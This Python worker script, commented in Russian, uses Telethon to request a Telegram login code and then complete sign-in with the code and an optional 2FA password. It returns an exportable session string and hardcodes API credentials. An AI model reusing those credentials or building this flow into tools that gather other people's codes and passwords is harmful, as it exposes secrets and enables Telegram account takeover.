# worker.py — отдельный процесс для Telethon
import asyncio
import sys
import json
from telethon import TelegramClient
from telethon.errors import PhoneNumberInvalidError

API_ID = 34518118
API_HASH = "804897aff1932a8b686b65f54cea9251"

async def send_code(phone):
    client = TelegramClient(f'session_{phone}', API_ID, API_HASH)
    await client.connect()
    try:
        result = await client.send_code_request(phone)
        await client.disconnect()
        return {"status": "ok", "phone_code_hash": result.phone_code_hash}
    except PhoneNumberInvalidError:
        await client.disconnect()
        return {"status": "error", "message": "Номер не зарегистрирован"}

async def complete_login(phone, code, phone_code_hash, password=None):
    client = TelegramClient(f'session_{phone}', API_ID, API_HASH)
    await client.connect()
    try:
        if password:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            await client.sign_in(password=password)
        else:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        session_string = client.session.save()
        await client.disconnect()
        return {"status": "ok", "session": session_string}
    except Exception as e:
        await client.disconnect()
        return {"status": "error", "message": str(e)}

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: worker.py <command> <json_args>")
        sys.exit(1)
    command = sys.argv[1]
    args = json.loads(sys.argv[2])
    if command == "send_code":
        result = asyncio.run(send_code(args["phone"]))
    elif command == "complete_login":
        result = asyncio.run(complete_login(
            args["phone"], 
            args["code"], 
            args["phone_code_hash"],
            args.get("password")
        ))
    print(json.dumps(result))
